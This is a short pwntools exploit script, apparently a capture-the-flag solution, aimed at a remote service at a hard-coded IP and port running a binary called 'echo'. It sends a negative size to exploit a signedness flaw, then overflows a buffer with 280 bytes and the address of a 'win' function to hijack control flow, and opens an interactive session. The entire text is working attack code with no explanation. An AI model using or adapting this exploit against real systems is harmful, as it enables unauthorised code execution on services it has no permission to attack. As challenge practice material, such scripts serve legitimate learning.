from pwn import *

elf = ELF('./echo')
#io = process(elf.path)
io = remote('34.170.146.252', 49150)

io.sendlineafter('Size: ', str(-0x80000000))

offset = 280
payload = b'a' * offset
payload += p64(elf.sym['win'])
io.sendlineafter('Data: ', payload)

io.interactive()
